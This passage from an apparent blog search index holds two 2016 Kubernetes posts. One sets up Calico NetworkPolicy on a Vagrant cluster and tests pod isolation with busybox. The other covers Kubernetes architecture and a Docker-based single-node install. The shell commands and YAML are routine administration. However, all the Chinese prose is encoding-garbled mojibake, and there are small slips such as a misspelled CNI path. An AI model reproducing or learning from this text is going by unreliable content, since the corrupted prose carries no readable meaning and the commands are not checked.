0garbage: 0size-garbage: 0","tags":["tips"]},{"title":"kubernetes II - network policy","path":"/2016/09/13/k8s-ii/","content":"0x00 designåœ¨ kubernetes é¡¹ç›®ä¸­ä¸€èˆ¬çš„ææ¡ˆä¼šåœ¨ repo çš„docs/proposalsä¸‹é¢ï¼Œè¿™æ¬¡æˆ‘ä¸»è¦å…³æ³¨networkPolicyç›¸å…³ææ¡ˆï¼Œå…³äº networkpolicy æ—©æœŸçš„ä¼šè®®è®¨è®ºå¯ä»¥è§ [^meeting], æä¾›ä¸€ä¸ª case[^draft2] å¯ä»¥çœ‹åˆ°å…¸å‹çš„åº”ç”¨æ–¹å¼ï¼Œç¤¾åŒºè®¨è®ºå®šç¨¿ä¸º [^manuscript], ç¬¬ä¸€æ¬¡æäº¤çš„ä»£ç åœ¨ patch #25638,é€šè¿‡issues&#x2F;22469æ¥è¿½è¸ªã€‚åˆæ­¥æ¥è§¦ networkpolicy ä¸ªäººä¹ æƒ¯è¿˜æ˜¯ä»å¦‚ä½•ä½¿ç”¨å¼€å§‹ï¼Œä»¥ä¸‹åŸºäºé…ç½®å®Œæˆåçš„æ•´ç†ï¼Œå¦‚æœé—®é¢˜è¿˜è¯·æ–§æ­£ã€‚ 0x10 create a clusteré¦–é€‰åœ¨æœ¬åœ°é…ç½®å•ä¸ª node å’Œ master çš„ k8s çš„é›†ç¾¤ï¼Œæ¨ègo getæ‹‰å–å›æ¥çš„æºç ç›®å½•ä¸­çš„cluster/kube-up.shè¿›è¡Œé›†ç¾¤éƒ¨ç½²ï¼Œæˆ‘æ¯”è¾ƒæ‡’æ‰€ä»¥å†™ä¸ªä¸€ä¸ªè„šæœ¬åšäº†ä¸ª wapper æŠŠä¸€äº›å˜é‡æ”¾è¿›å»äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/bin/bashiptables -Fiptables -Ziptables -Xexport KUBERNETES_PROVIDER=vagrantexport KUBERNETES_VAGRANT_USE_NFS=trueexport ALLOW_PRIVILEGED=trueexport VAGRANT_HTTP_PROXY=http://username:password@10.0.58.88:8080export VAGRANT_HTTPS_PROXY=http://username:password@10.0.58.88:8080install() &#123; rpm -qa | grep vagrant-libvirt if [ $? != 0 ]; then dnf install vagrant-libvirt -y fi pushd $GOPATH/src/github.com/kubernetes/kubernetes ./cluster/kube-up.sh popd exit 0&#125;remove() &#123; sudo virsh destroy kubernetes_master sudo virsh destroy kubernetes_node-1 sudo virsh undefine kubernetes_master sudo virsh undefine kubernetes_node-1 sudo rm -rf /var/lib/libvirt/images/kubernetes_* sudo rm -rf /var/lib/libvirt/qemu/ sudo rm -rf /var/lib/libvirt/dnsmasq/ sudo systemctl restart libvirtd.service exit 0&#125;down() &#123; ./cluster/kube-down.sh exit 0&#125;$1echo &quot;please input $0 install or $0 remove&quot; VAGRANT_HTTP_PROXYå˜é‡æ˜¯ vagrant æä¾›çš„ä¸€ä¸ªæ’ä»¶å¯ä»¥åœ¨åˆ›å»ºçš„è™šæ‹ŸæœºèŠ‚ç‚¹ä¸­æ³¨å…¥ä»£ç†ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨NFSé¿å…äº†rsyncé€ æˆé¢å¤–çš„ç£ç›˜æµªè´¹ï¼Œå¦‚æœè¿˜éœ€è¦é¢„é…ç½®ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿æ¯”å¦‚dnfä»£ç†åœ¨è™šæ‹ŸæœºèŠ‚ç‚¹ä¸­å¯ä»¥ 1qemu-system-x86_64 /var/lib/libvirt/images/kube-fedora23_vagrant_box_image_0.img -m 2048 å¼€å¯è™šæ‹Ÿæœºåœ¨å…¶ä¸­ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç„¶åé€€å‡ºæ³¨æ„ä¸€è‡´æ€§é—®é¢˜ (æ¯”å¦‚ dnf è¢«C+cé—ç•™.lock æ–‡ä»¶), é‡æ–°è¿è¡Œæˆ‘çš„å° wapper æŠŠä¸€äº›é—ç•™çš„é…ç½®æ–‡ä»¶æ¸…ç†æ‰ï¼Œç„¶åé‡æ–°åˆ›å»ºï¼Œä¸€åˆ‡æ­£å¸¸å¯ä»¥çœ‹è§é›†ç¾¤ä¿¡æ¯ 123456789$ kubectl cluster-infoKubernetes master is running at https://10.245.1.2Heapster is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/heapsterKubeDNS is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kube-dnskubernetes-dashboard is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/kubernetes-dashboardGrafana is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-grafanaInfluxDB is running at https://10.245.1.2/api/v1/proxy/namespaces/kube-system/services/monitoring-influxdbTo further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;. 0x20 install network solution Kubernetes itself doesnâ€™t enforce NetworkPolicy. Youâ€™ll need to run a networking solution like Calico, Canal, etc as your network plugin to get NetworkPolicy features. network solution é€‰æ‹©äº† calico å¹¶ä¸”é€‰æ‹©æ‰‹å·¥é…ç½®å°†å…¶æ·»åŠ åˆ°å·²ç»å­˜åœ¨çš„é›†ç¾¤å½“ä¸­ã€‚ 0x21 å‡†å¤‡é•œåƒåœ¨ master å’Œ node ä¸Šé¢ pull é•œåƒ 123docker pull docker.io/calico/cnidocker pull docker.io/calico/kube-policy-controllerdocker pull quay.io/calico/node 0x22 å‡†å¤‡ kubeletåœ¨ master å’Œ node åˆ†åˆ« ä¸‹è½½å¿…è¦å‘½ä»¤è¡Œå·¥å…·ï¼Œè™½ç„¶loopbackåœ¨ master ä¸æ˜¯å¿…é¡»çš„ä½†æ˜¯å¤šä¸€ä¸ªä¹Ÿæ— æ‰€è°“ (æ‡’å¾—æ”¹è„šæœ¬) 12345678910wget http://www.projectcalico.org/builds/calicoctlsudo chmod +x calicoctlwget -N -P /opt/cni/bin https://github.com/projectcalico/calico-cni/releases/download/v1.4.1/calicowget -N -P /opt/cni/bin https://github.com/projectcalico/calico-cni/releases/download/v1.4.1/calico-ipamchmod +x /opt/cni/bin/calico /opt/cni/bin/calico-ipamwget https://github.com/containernetworking/cni/releases/download/v0.3.0/cni-v0.3.0.tgztar -zxvf cni-v0.3.0.tgzcp loopback /opt/cin/bin/ master å’Œ node æ·»åŠ é…ç½®æ–‡ä»¶ 123456789101112131415mkdir -p /etc/cni/net.dcat &gt;/etc/cni/net.d/10-calico.conf &lt;&lt;EOF&#123; &quot;name&quot;: &quot;calico-k8s-network&quot;, &quot;type&quot;: &quot;calico&quot;, &quot;etcd_endpoints&quot;: &quot;http://&lt;ETCD_IP&gt;:&lt;ETCD_PORT&gt;&quot;, &quot;log_level&quot;: &quot;info&quot;, &quot;ipam&quot;: &#123; &quot;type&quot;: &quot;calico-ipam&quot; &#125;, &quot;policy&quot;: &#123; &quot;type&quot;: &quot;k8s&quot; &#125;&#125;EOF å› ä¸ºé€šè¿‡cluster/kube-up.shåˆ›å»ºçš„é›†ç¾¤æ˜¯é€šè¿‡ systemd ç®¡ç†çš„ kubelet å¯åŠ¨æ‰€ä»¥å‘½ä»¤è¡Œå‚æ•°çš„ä¼ å…¥ä½äº/etc/sysconfig/kubelet, æ·»åŠ DAEMON_ARGSå˜é‡æ·»åŠ --network-plugin=cni --cni-conf-dir=/etc/cni/net.d --network-plugin-dir=/etc/cni/net.d,è€Œåé‡æ–°å¯åŠ¨æœåŠ¡ã€‚ 0x23 åˆ›å»º calico nodeåœ¨ master å’Œ node ä¸Šé¢åˆ†åˆ«ETCD_ENDPOINTSæ˜¯ä½  master å’Œ master çš„ etcd çš„ç«¯å£ã€‚ 1ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl node ç„¶ååœ¨ä»»æ„æœºå™¨ä¸‹é¢éƒ½å¯ä»¥çœ‹è§ 123456789101112[root@kubernetes-master ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl statuscalico-node container is running. Status: Up About a minuteRunning felix version 1.4.0IPv4 BGP statusIP: 10.245.1.2 AS Number: 64511 (inherited)+--------------|-------------------|-------|----------|-------------+| Peer address | Peer type | State | Since | Info |+--------------|-------------------|-------|----------|-------------+| 10.245.1.3 | node-to-node mesh | up | 08:22:15 | Established |+--------------|-------------------|-------|----------|-------------+ 0x24 åˆ›å»º policy-controlleråœ¨å¼€å‘æœºä¸Šä¸‹è½½policy-controllerå¹¶ä¿®æ”¹å…¶ä¸­çš„ETCD_ENDPOINTSå’Œimages(ä½¿ç”¨ç°æœ‰çš„é•œåƒæ¯”è¾ƒå¿«). 1234567891011spec: hostNetwork: true containers: - name: calico-policy-controller # Make sure to pin this to your desired version. image: calico/kube-policy-controller env: # Configure the policy controller with the location of # your etcd cluster. - name: ETCD_ENDPOINTS value: &quot;http://10.245.1.2:4379&quot; åœ¨å¼€å‘æœºä¸Šé€šè¿‡ä¸Šé¢ä¸‹è½½çš„yamlæ–‡ä»¶åˆ›å»ºcontroller. 1$ kubectl create -f policy-controller.yaml 0x25 é…ç½®ç¡®è®¤åœ¨å¼€å‘æœºå™¨ä¸Šç¡®è®¤ä¸€ä¸‹ calico-policy-controller çš„çŠ¶æ€æ˜¯å¦æ­£å¸¸ã€‚ 12345678$ kubectl get pod --namespace=kube-systemNAME READY STATUS RESTARTS AGEcalico-policy-controller-0i4so 1/1 Running 1 23hheapster-v1.2.0-2582472167-91sw6 4/4 Running 24 4dkube-dns-v19-dfhx9 3/3 Running 41 4dkube-proxy-kubernetes-node-1 1/1 Running 7 4dkubernetes-dashboard-v1.4.0-gydiz 1/1 Running 22 4dmonitoring-influxdb-grafana-v4-auln8 2/2 Running 15 4d å¹¶ç¡®è®¤ master å’Œ node ä¸Š calico-node å®¹å™¨æ˜¯å¦æ­£å¸¸ã€‚ 0x30 test network policyåœ¨å¼€å‘æœºä¸Šé¢åˆ›å»º namespace åä¸º test ä¸”åœ¨å¯¹å…¶é…ç½®æ¯ pod éš”ç¦»ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»ºåä¸º nginx çš„ deployment å’Œ service, 1234kubectl create ns test # åˆ›å»º test å‘½åç©ºé—´kubectl annotate ns test &quot;net.beta.kubernetes.io/network-policy=&#123;\\&quot;ingress\\&quot;: &#123;\\&quot;isolation\\&quot;: \\&quot;DefaultDeny\\&quot;&#125;&#125;&quot; --overwrite # æ¯ pod éš”ç¦»kubectl --namespace=test run nginx --image=nginx # åˆ›å»º deployment kubectl --namespace=test expose deployment nginx --port=80 # åˆ›å»º service åœ¨ test å®£å‘Šé»˜è®¤ deny æ—¶å€™å¯ä»¥åœ¨ master æˆ–è€… node ä¸Šé¢è¿è¡Œå¦‚ä¸‹ã€‚ 12345678910111213[root@kubernetes-node-1 ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl profile show+--------------------+| Name |+--------------------+| k8s_ns.default || k8s_ns.kube-system || k8s_ns.test |+--------------------+[root@kubernetes-node-1 ~]# ETCD_ENDPOINTS=http://10.245.1.2:4379 ./calicoctl profile k8s_ns.test rule showInbound rules: 1 denyOutbound rules: 1 allow æŸ¥çœ‹ä¿¡æ¯ï¼Œpod æ˜¯ä¸æ˜¯æ­£å¸¸è¿è¡Œã€‚ 12345kubectl --namespace=test get svc,podNAME CLUSTER-IP EXTERNAL-IP PORT(S) AGEsvc/nginx 10.247.114.187 &lt;none&gt; 80/TCP 3hNAME READY STATUS RESTARTS AGEpo/nginx-701339712-wcim9 1/1 Running 0 3h 0x31 æµ‹è¯•é…ç½®æ¯ pod éš”ç¦»ï¼Œç„¶åé…ç½® networkpolicy çš„ selector . 12345678910111213141516171819202122232425262728293031323334353637$ kubectl annotate ns test &quot;net.beta.kubernetes.io/network-policy=&#123;\\&quot;ingress\\&quot;: &#123;\\&quot;isolation\\&quot;: \\&quot;DefaultDeny\\&quot;&#125;&#125;&quot; --overwritenamespace &quot;test&quot; annotated$ cat network-policy.yaml kind: NetworkPolicyapiVersion: extensions/v1beta1metadata: name: access-nginx namespace: testspec: podSelector: matchLabels: run: nginx ingress: - from: - podSelector: matchLabels: access: &quot;true&quot;$ kubectl create -f network-policy.yaml networkpolicy &quot;access-nginx&quot; created$ kubectl --namespace=test run busybox --rm -ti --labels=&quot;access=true&quot; --image=busybox /bin/sh Waiting for pod test/busybox-3554646944-irgeg to be running, status is Pending, pod ready: falseIf you don&#x27;t see a command prompt, try pressing enter./ # wget nginxConnecting to nginx (10.247.114.187:80)index.html 100% |**********************************************************************************************************************************************************| 612 0:00:00 ETA/ # Session ended, resume using &#x27;kubectl attach busybox-3554646944-irgeg -c busybox -i -t&#x27; command when the pod is runningdeployment &quot;busybox&quot; deleted$ kubectl --namespace=test run busybox --rm -ti --image=busybox /bin/sh Waiting for pod test/busybox-3674381263-0solq to be running, status is Pending, pod ready: falseIf you don&#x27;t see a command prompt, try pressing enter./ # wget --timeout=1 nginxConnecting to nginx (10.247.114.187:80)wget: download timed out/ # Bingo! å¯ä»¥çœ‹è§ä¸å¸¦æ ‡ç­¾çš„è¢«éš”ç¦»äº†ï¼Œå¸¦æ ‡ç­¾çš„æ­£å¸¸è¿è¡Œã€‚ [^user-stories]: Kube Networking User Stories[^meeting]: Kubernetes Network SIG Meeting[^draft2]: Kubernetes NetworkPolicy draft 2[^manuscript]: NetworkPolicy[^walkthrough]: walkthrough[^networkinterface]: container network interface","tags":["docker"]},{"title":"kubernetes I - learn & install","path":"/2016/09/13/k8s-i/","content":"0x00 backgroundå› æ–°é¡¹ç›®ä¸ kubernetes æœ¬èº«ç›¸å…³ï¼Œè€Œæˆ‘å¯¹ kubernetes çš„å¤æ‚ä¸€æ— æ‰€çŸ¥ï¼Œæ‰€ä»¥éœ€è¦æ¢ç´¢å®ƒã€‚è¿™ä¸ª post ä¸»è¦è®°å½•å­¦ä¹  k8s æ¢³ç†å‡ºæ¥çš„ XCx åŸºæœ¬æ¦‚å¿µä»¥åŠå¦‚ä½•å‚ä¸å¼€å‘ï¼Œéƒ¨åˆ†å›¾ç‰‡æ¥æºäº [^slideshare], å¤§é‡èµ„æ–™æ¥è‡ª [^officialdoc], æœ‰ç‚¹è¡¥å……â€å®˜ç½‘çš„æ–‡æ¡£ä¸å¦‚ repo é‡Œé¢æ¥çš„å…¨é¢â€! 0x01 whatâ€™s kubernetes ?Kubernetes(ç¼©å†™ k8s) æ˜¯ Google å¼€æºçš„å®¹å™¨é›†ç¾¤ç®¡ç†ç³»ç»Ÿï¼Œä¸»è¦æ˜¯ go å®ç°ï¼Œå…¶ç›®çš„æ˜¯æä¾›åº”ç”¨éƒ¨ç½²ï¼Œç»´æŠ¤ï¼Œæ‰©å±•æœºåˆ¶ç­‰åŠŸèƒ½ï¼Œåˆ©ç”¨ Kubernetes èƒ½æ–¹ä¾¿åœ°ç®¡ç†è·¨æœºå™¨è¿è¡Œå®¹å™¨åŒ–çš„åº”ç”¨ã€‚å…¶ä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼š ä½¿ç”¨ Docker å¯¹åº”ç”¨ç¨‹åºåŒ…è£… (package), å®ä¾‹åŒ– (instantiate), è¿è¡Œ (run). ä»¥é›†ç¾¤çš„æ–¹å¼è¿è¡Œï¼Œç®¡ç†è·¨æœºå™¨çš„å®¹å™¨ã€‚ è§£å†³ Docker è·¨æœºå™¨å®¹å™¨ä¹‹é—´çš„é€šè®¯é—®é¢˜ã€‚ Kubernetes çš„è‡ªæˆ‘ä¿®å¤æœºåˆ¶ä½¿å¾—å®¹å™¨é›†ç¾¤æ€»æ˜¯è¿è¡Œåœ¨ç”¨æˆ·æœŸæœ›çš„çŠ¶æ€ã€‚ 0x02 why kubernetes?kubernetes æ˜¯å®¹å™¨ç¼–æ’å·¥å…·ï¼Œç›®å‰è¿™æ˜¯æœ€å…·ç«äº‰çš„é¢†åŸŸä¹‹ä¸€ï¼Œå°‘æ•°å‡ ä¸ªå®¹å™¨ç®¡ç†ç®€å•ï¼Œä½†æ˜¯è°ƒåº¦ç®¡ç†ä»¥åŠç›‘æ§å¤§è§„æ¨¡å®¹å™¨å¾ˆå…·æœ‰æŒ‘æˆ˜æ€§ï¼Œç¼–æ’å·¥å…·å¤„ç†å¤šç§å¤šæ ·ä»»åŠ¡ï¼Œå¦‚æŸ¥æ‰¾æœ€ä¼˜çš„ä½ç½®æˆ–è€…æœåŠ¡å™¨æ¥è¿è¡Œå®¹å™¨ï¼Œå¤„ç†å¤±è´¥çš„ä»»åŠ¡ï¼Œåˆ†äº«å‚¨å­˜å·æˆ–è€…åˆ›å»ºè´Ÿè½½å‡è¡¡ä¸å®¹å™¨é—´é€šè®¯çš„è¦†ç›–ç½‘ç»œç­‰ã€‚å¸¸è§çš„å®¹å™¨ç¼–æ’é¡¹ç›®å¦‚ä¸‹ï¼š Kubernetes: æ˜¯ Googlet å›¢é˜Ÿå‘èµ·å¹¶ç»´æŠ¤çš„ï¼Œç›®å‰åœ¨åŠŸèƒ½ç‰¹æ€§æ–¹é¢æ˜¯æœ€å…ˆè¿›çš„ã€‚ Docker Swarm: å…è®¸åœ¨ Docker é›†ç¾¤ä¸­è°ƒåº¦å®¹å™¨ï¼Œä¸ Docker ç¯å¢ƒç´§å¯†é›†æˆã€‚ Mesosphere: é€šç”¨æ•°æ®ä¸­å¿ƒç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿèƒ½ç®¡ç†å®¹å™¨ï¼Œè¿˜å¯ä»¥ä¸å…¶å®ƒç¼–æ’ç³»ç»Ÿ (å¦‚ Kubernetes) é›†æˆã€‚ CoreOS fleet: CoreOS æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œç®¡ç†åœ¨ CoreOS é›†ç¾¤ä¸­ä»»ä½•è°ƒåº¦å‘½ä»¤ã€‚ 0x10 k8s architecture[^design]k8s çš„æ¶æ„è®¾è®¡ï¼š æ¶æ„å›¾ ç”±å›¾å¯è§ Kubernetes é¦–å…ˆæ˜¯ä¸€å¥—åˆ†å¸ƒå¼ç³»ç»Ÿï¼ŒèŠ‚ç‚¹åˆ†ä¸ºä¸¤ç±»ï¼šä¸€ç±»æ˜¯å±äºç®¡ç†å¹³é¢çš„ä¸»èŠ‚ç‚¹ &#x2F; æ§åˆ¶èŠ‚ç‚¹ (Master Node); ä¸€ç±»æ˜¯å±äºè¿è¡Œå¹³é¢çš„å·¥ä½œèŠ‚ç‚¹ (Worker Node); å¤æ‚çš„å·¥ä½œäº¤ç»™æ§åˆ¶èŠ‚ç‚¹å»åšäº†ï¼Œå·¥ä½œèŠ‚ç‚¹è´Ÿè´£æä¾›ç¨³å®šçš„æ“ä½œæ¥å£å’Œèƒ½åŠ›æŠ½è±¡ã€‚æ²¡æœ‰èƒ½å‘ç° Kubernetes ä¸­å¯¹äºæ§åˆ¶å¹³é¢çš„åˆ†å¸ƒå¼å®ç°ï¼Œä½†æ˜¯ç”±äºæ•°æ®åç«¯è‡ªèº«å°±æ˜¯ä¸€å¥—åˆ†å¸ƒå¼çš„æ•°æ®åº“ (etcd), å› æ­¤å¯ä»¥å¾ˆå®¹æ˜“æ‰©å±•åˆ°åˆ†å¸ƒå¼å®ç°ã€‚ 0x11 The Kubernetes Node kubelet: æ˜¯å·¥ä½œèŠ‚ç‚¹æ‰§è¡Œæ“ä½œçš„ agent, è´Ÿè´£å…·ä½“çš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œæ ¹æ®ä»æ•°æ®åº“ä¸­è·å–çš„ä¿¡æ¯æ¥ç®¡ç†å®¹å™¨ï¼Œå¹¶ä¸ŠæŠ¥ pod è¿è¡ŒçŠ¶æ€ç­‰; kube-proxy: æ˜¯ä¸€ä¸ªç®€å•çš„ç½‘ç»œè®¿é—®ä»£ç†ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ª Load Balancer. å®ƒè´Ÿè´£å°†è®¿é—®åˆ°æŸä¸ªæœåŠ¡çš„è¯·æ±‚å…·ä½“åˆ†é…ç»™å·¥ä½œèŠ‚ç‚¹ä¸Šçš„ Pod(åŒä¸€ç±»æ ‡ç­¾). 0x12 The Kubernetes Control Planeservices of master node apiserver æ˜¯æ•´ä¸ªç³»ç»Ÿçš„å¯¹å¤–æ¥å£ï¼Œæä¾›ä¸€å¥— RESTful çš„ Kubernetes API, ä¾›å®¢æˆ·ç«¯å’Œå…¶å®ƒç»„ä»¶è°ƒç”¨; scheduler è´Ÿè´£å¯¹èµ„æºè¿›è¡Œè°ƒåº¦ï¼Œåˆ†é…æŸä¸ª pod åˆ°æŸä¸ªèŠ‚ç‚¹ä¸Šæ˜¯ pluggable çš„ï¼Œæ„å‘³ç€å¾ˆå®¹æ˜“é€‰æ‹©å…¶å®ƒå®ç°æ–¹å¼; controller-manager è´Ÿè´£ç®¡ç†æ§åˆ¶å™¨ï¼ŒåŒ…æ‹¬ endpoint-controller(åˆ·æ–°æœåŠ¡å’Œ pod çš„å…³è”ä¿¡æ¯) å’Œ replication-controller(ç»´æŠ¤æŸä¸ª pod çš„å¤åˆ¶ä¸ºé…ç½®çš„æ•°å€¼). worker kubelet æ˜¯å·¥ä½œèŠ‚ç‚¹æ‰§è¡Œæ“ä½œçš„ agent, è´Ÿè´£å…·ä½“çš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œæ ¹æ®ä»æ•°æ®åº“ä¸­è·å–çš„ä¿¡æ¯æ¥ç®¡ç†å®¹å™¨ï¼Œå¹¶ä¸ŠæŠ¥ pod è¿è¡ŒçŠ¶æ€ç­‰; kube-proxy æ˜¯ä¸€ä¸ªç®€å•çš„ç½‘ç»œè®¿é—®ä»£ç†ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ª Load Balancer. å®ƒè´Ÿè´£å°†è®¿é—®åˆ°æŸä¸ªæœåŠ¡çš„è¯·æ±‚å…·ä½“åˆ†é…ç»™å·¥ä½œèŠ‚ç‚¹ä¸Šçš„ Pod(åŒä¸€ç±»æ ‡ç­¾). etcd etcd ä½œä¸ºæ•°æ®åç«¯ï¼Œåˆä½œä¸ºæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œé€šè¿‡ etcd æ¥å­˜å‚¨æ‰€æœ‰çš„ä¸»èŠ‚ç‚¹ä¸Šçš„çŠ¶æ€ä¿¡æ¯ï¼Œå¾ˆå®¹æ˜“å®ç°ä¸»èŠ‚ç‚¹çš„åˆ†å¸ƒå¼æ‰©å±•ï¼Œç»„ä»¶å¯ä»¥è‡ªåŠ¨çš„å»ä¾¦æµ‹ etcd ä¸­çš„æ•°å€¼å˜åŒ–æ¥è·å¾—é€šçŸ¥ï¼Œå¹¶ä¸”è·å¾—æ›´æ–°åçš„æ•°æ®æ¥æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚ 0x20 quick practiceå‰é¢ç®€è¦è¯´æ˜æ¶æ„è®¾è®¡ï¼Œè¿™é‡Œä»‹ç»ä¸€äº› k8s çš„å‡ ä¸ªæ¦‚å¿µä¸ä¸»è¦ç»„ä»¶ä½œç”¨å›¾ç¤ºï¼Œåœ¨å¿«é€Ÿå®è·µä¸­ä¼šå¯¹å…¶æœ‰ä¸ªåˆæ­¥å°è±¡ï¼Œæ›´å¤šæ¦‚å¿µæ€§çš„ä¸œè¥¿å‚è€ƒ [^term]. Cluster: é›†ç¾¤æ˜¯æŒ‡ç”± Kubernetes ä½¿ç”¨ä¸€ç³»åˆ—çš„ç‰©ç†æœºï¼Œè™šæ‹Ÿæœºå’Œå…¶ä»–åŸºç¡€èµ„æºæ¥è¿è¡Œä½ çš„åº”ç”¨ç¨‹åºã€‚ Node: ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªè¿è¡Œ Kubernetes ä¸­çš„ä¸»æœºã€‚ Pod: ä¸€ä¸ª Pod å¯¹åº”äºç”±è‹¥å¹²å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®¹å™¨ç»„ï¼ŒåŒä¸ªç»„å†…çš„å®¹å™¨å…±äº«ä¸€ä¸ªå­˜å‚¨å· (volume). Pos-states: åŒ…å«æ‰€æœ‰å®¹å™¨çŠ¶æ€é›†åˆï¼ŒåŒ…æ‹¬å®¹å™¨ç»„çŠ¶æ€ç±»å‹ï¼Œå®¹å™¨ç»„ç”Ÿå‘½å‘¨æœŸï¼Œäº‹ä»¶ï¼Œé‡å¯ç­–ç•¥ï¼Œä»¥åŠ replication controllers. Replication-Controllers: ä¸»è¦è´Ÿè´£æŒ‡å®šæ•°é‡çš„ pod åœ¨åŒä¸€æ—¶é—´ä¸€èµ·è¿è¡Œã€‚ Services: ä¸€ä¸ª Kubernetes æœåŠ¡æ˜¯å®¹å™¨ç»„é€»è¾‘çš„é«˜çº§æŠ½è±¡ï¼ŒåŒæ—¶ä¹Ÿå¯¹å¤–æä¾›è®¿é—®å®¹å™¨ç»„çš„ç­–ç•¥ã€‚ Volumes: ä¸€ä¸ªå·å°±æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå®¹å™¨å¯¹å…¶æœ‰è®¿é—®æƒé™ã€‚ Labels: æ ‡ç­¾æ˜¯ç”¨æ¥è¿æ¥ä¸€ç»„å¯¹è±¡çš„ï¼Œæ¯”å¦‚å®¹å™¨ç»„ã€‚æ ‡ç­¾å¯ä»¥è¢«ç”¨æ¥ç»„ç»‡å’Œé€‰æ‹©å­å¯¹è±¡ã€‚ Namespace : Namespace å¥½æ¯”ä¸€ä¸ªèµ„æºåå­—çš„å‰ç¼€ã€‚å®ƒå¸®åŠ©ä¸åŒçš„é¡¹ç›®ï¼Œå›¢é˜Ÿæˆ–æ˜¯å®¢æˆ·å¯ä»¥å…±äº« cluster, é˜²æ­¢å‘½åå†²çªã€‚ selector: æ˜¯ä¸€ä¸ªé€šè¿‡åŒ¹é… labels æ¥å®šä¹‰èµ„æºä¹‹é—´å…³ç³»å¾—è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ä¸ºä¸€ä¸ªè´Ÿè½½å‡è¡¡çš„ service æŒ‡å®šæ‰€ç›®æ ‡ Pod. å•èŠ‚ç‚¹ä» docker å¿«é€Ÿéƒ¨ç½² k8s é€»è¾‘ç¤ºæ„å›¾ï¼š 0x21 by dockeråˆ©ç”¨ docker å¯ä»¥å¿«é€Ÿä¸Šæ‰‹ k8s(ä»…é™äºå•æœº), ä¸è¿‡åœ¨ 1.3 çš„åˆ†æ”¯é‡Œé¢è¿™ä¸ªæ–‡æ¡£å·²ç»è¢«å¼„ä¸¢äº†ã€‚åœ¨ä½¿ç”¨ docker ä¹‹å‰ä¾èµ–å…ˆå†³æ¡ä»¶ (kernel æ”¯æŒ memory and swap accounting, å¯ç”¨ cgroup çš„ momory æ§åˆ¶å™¨), ä¸è¿‡ä½ é»˜è®¤å®‰è£…è¾ƒæ–°çš„ linux å‘è¡Œç‰ˆä¸€èˆ¬éƒ½èƒ½æ»¡è¶³ã€‚æ‰‹å·¥æ‹‰å–ä¸€ä¸ªé•œåƒgcr.io/google_containers/hyperkube:v1.3.7, åˆ©ç”¨è¿™ä¸ªé•œåƒåˆ›å»ºå®¹å™¨æ—¶å€™ä¼šè‡ªå·±æ‹‰å–å…¶ä»–é•œåƒã€‚ 123456$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE$ sudo docker pull gcr.io/google_containers/hyperkube:v1.3.7$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEgcr.io/google_containers/hyperkube v1.3.7 24db5b90d9c0 8 days ago 404.7 MB masterå¯åŠ¨ä¸»èŠ‚ç‚¹ã€‚ 1234567891011121314151617# docker run \\ --volume=/:/rootfs:ro \\ --volume=/sys:/sys:ro \\ --volume=/dev:/dev \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --volume=/var/lib/kubelet/:/var/lib/kubelet:rw \\ --volume=/var/run:/var/run:rw \\ --net=host \\ --pid=host \\ --privileged=true \\ -d \\ gcr.io/google_containers/hyperkube:v1.3.7 \\ /hyperkube kubelet --containerized \\ --hostname-override=&quot;127.0.0.1&quot; \\ --address=&quot;0.0.0.0&quot; \\ --api-servers=http://localhost:8080 \\ --config=/etc/kubernetes/manifests service proxyåœ¨ tag 1.3.7 é‡Œé¢ä¸éœ€è¦æ‰‹å·¥å» etcd äº†ï¼Œåœ¨å¯åŠ¨æœåŠ¡ä»£ç†æ—¶å€™ä¼šè‡ªåŠ¨å¸®å¯åŠ¨ã€‚ 12345# docker run -d --net=host \\ --privileged gcr.io/google_containers/hyperkube:v1.3.7 \\ /hyperkube proxy \\ --master=http://127.0.0.1:8080 \\ --v=2 å¯åŠ¨å®Œæˆä¸»èŠ‚ç‚¹ä¸æœåŠ¡ä»£ç†è¿‡åï¼Œç»è¿‡ä¸€æ®µæ—¶é—´ç­‰å¾… (çŒœæµ‹æ—¶é—´é•¿çŸ­å–å†³äºç½‘é€Ÿ), å¯ä»¥å‘ç°é•œåƒä¾èµ–è‡ªå·±è§£å†³äº†ã€‚ 1234567891011$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEgcr.io/google_containers/hyperkube-amd64 v1.3.7 24db5b90d9c0 8 days ago 404.7 MBgcr.io/google_containers/hyperkube v1.3.7 24db5b90d9c0 8 days ago 404.7 MBgcr.io/google_containers/kubernetes-dashboard-amd64 v1.1.1 f739d2414b14 6 weeks ago 55.83 MBgcr.io/google_containers/exechealthz-amd64 1.1 c3a89c92ef5b 7 weeks ago 8.332 MBgcr.io/google_containers/kubedns-amd64 1.5 3afb7dbce540 12 weeks ago 50.82 MBgcr.io/google-containers/kube-addon-manager-amd64 v4 fb28c478466a 3 months ago 240.4 MBgcr.io/google_containers/kube-dnsmasq-amd64 1.3 